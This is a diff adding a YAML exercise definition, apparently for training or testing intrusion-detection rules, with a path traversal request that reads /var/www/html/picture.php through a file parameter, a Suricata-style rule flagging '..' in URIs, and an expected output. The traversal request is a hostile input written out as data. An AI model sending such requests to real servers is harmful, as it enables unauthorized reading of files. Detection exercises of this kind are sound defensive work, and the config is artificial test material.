@@ -1,0 +1,24 @@
+name: 'Path Traversal (Param)'
+type: 'exploit'
+
+text: |-
+  **Goal: Fetch /var/www/html/picture.php**
+
+hints: []
+
+target:
+  dev:
+    host: localhost
+    port: 10004
+  prod:
+    host: detector
+    port: 80
+
+base_request: |-
+  GET /picture.php?file=../../../../../../../var/www/html/picture.php HTTP/1.1
+  Host: localhost
+
+rules:
+- 'alert http any any -> any any (msg:"%%ID%%"; flow:to_server,established; http.method; content:"GET"; http.uri.raw; content:".."; sid:1030005; rev:1;)'
+
+expected_output: "mime_content_type"
